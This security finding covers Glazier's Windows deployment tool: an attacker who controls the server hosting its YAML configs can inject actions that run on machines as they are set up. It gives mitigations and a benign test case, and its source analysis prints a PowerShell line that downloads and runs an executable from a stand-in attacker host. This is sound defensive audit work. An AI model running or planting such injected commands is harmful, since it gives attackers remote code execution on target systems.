- Vulnerability Name: Malicious Configuration Injection
- Description:
  - An attacker compromises the web server hosting Glazier's YAML configuration files.
  - The attacker modifies a configuration file (e.g., `build.yaml`) to inject malicious actions.
  - When a target Windows system boots into WinPE and runs Glazier, it fetches the compromised configuration file over HTTPS.
  - Glazier parses the malicious configuration file and executes the injected actions on the target system.
  - These actions can include downloading and executing arbitrary executables, running PowerShell scripts, modifying the registry, or any other actions supported by Glazier.
  - For example, the attacker could inject an `Execute` action to download and run a reverse shell, granting them unauthorized access to the target system.
- Impact:
  - Critical. Successful exploitation allows the attacker to gain complete control over the target Windows system during the deployment process.
  - This can lead to data theft, malware installation, system disruption, or use of the compromised system as a foothold in the network.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
  - HTTPS is enforced for fetching configuration files, providing encryption in transit and server authentication if certificates are properly validated. However, this does not prevent attacks if the web server itself is compromised.
- Missing Mitigations:
  - **Configuration File Signing/Verification:** Implement a mechanism to digitally sign configuration files. Glazier should verify the signature before parsing and executing the configuration. This would ensure that only authorized configurations are processed.
  - **Principle of Least Privilege on Web Server:** Harden the web server hosting configuration files and apply the principle of least privilege to minimize the impact of a web server compromise. Regularly audit and patch the web server.
  - **Input Validation and Sanitization in Actions (Defense in Depth):** While the primary vulnerability is configuration injection, actions that execute commands or scripts should ideally have input validation to prevent potential command injection if configurations are ever dynamically generated or if there are vulnerabilities in the configuration parsing logic itself (as a defense in depth measure). However, in the current context where configurations are static YAML files, signature verification is the more pertinent mitigation.
- Preconditions:
  - The attacker must be able to compromise the web server hosting Glazier's YAML configuration files. This could be achieved through various web server vulnerabilities, weak credentials, or insider threats.
  - A target Windows system must be booting and configured to use Glazier and fetch configurations from the compromised web server.
- Source Code Analysis:
  - Glazier's core logic resides in `autobuild.py`. The `ConfigBuilder` class in `glazier/lib/config/builder.py` is responsible for fetching and parsing configuration files. The `ConfigRunner` class in `glazier/lib/config/runner.py` executes the actions defined in the configuration.
  - The `ConfigBuilder.Start()` function fetches the root `build.yaml` and recursively includes other YAML files as defined in the configuration.
  - The configuration files are parsed using PyYAML. PyYAML itself has had security vulnerabilities in the past (deserialization issues), but assuming a reasonably up-to-date PyYAML version is used, the primary risk is the content of the YAML files themselves if they are maliciously modified.
  - The `ConfigRunner.Start()` function reads the task list (which is built from the YAML configurations) and executes each action in order.
  - Actions are defined in `glazier/lib/actions/`. Actions like `Execute`, `PSCommand`, `PSScript`, `RegAdd`, `RegDel`, `GooGetInstall`, `CopyFile`, `CopyDir`, `Driver`, `UpdateMSU`, `Unzip`, `Get`/`pull` are implemented to perform various system operations based on the parameters provided in the configuration.
  - **Vulnerability Trigger:** An attacker modifies a YAML file on the web server, for example, `/config/build.yaml`. They inject a malicious `Execute` action:

```yaml
controls:
  - Execute:
    - ['powershell.exe -Command "Invoke-WebRequest -Uri http://attacker.com/evil.exe -OutFile C:\\evil.exe; C:\\evil.exe"']
```

  - When a Glazier client boots and processes this modified `build.yaml`, the `Execute` action will be added to the task list.
  - `ConfigRunner` will then execute this action, causing the PowerShell command to be run. This command downloads `evil.exe` from `attacker.com` and executes it on the target system.

- Security Test Case:
  1. Setup a Glazier environment with a web server hosting configuration files.
  2. Create a test configuration `build.yaml` that includes a benign action, e.g., creating a directory.
  3. Boot a test Windows VM using Glazier and verify that the benign action from the original `build.yaml` is executed successfully.
  4. Compromise the web server (for testing purposes, this can be simulated by gaining access to the configuration files).
  5. Modify the `build.yaml` file on the web server and inject a malicious `Execute` action, for example:

```yaml
controls:
  - Execute:
    - ['powershell.exe -Command "New-Item -ItemType Directory -Path C:\\pwned"']
```
  6. Boot another test Windows VM using Glazier, pointing to the modified configuration on the (simulated) compromised web server.
  7. After the Glazier process completes (or is expected to reach the malicious action), check the target VM.
  8. **Verification:** Observe that the directory `C:\pwned` has been created on the target system, demonstrating successful execution of the injected malicious action. In a real attack scenario, the injected action would be more harmful, like downloading and executing malware.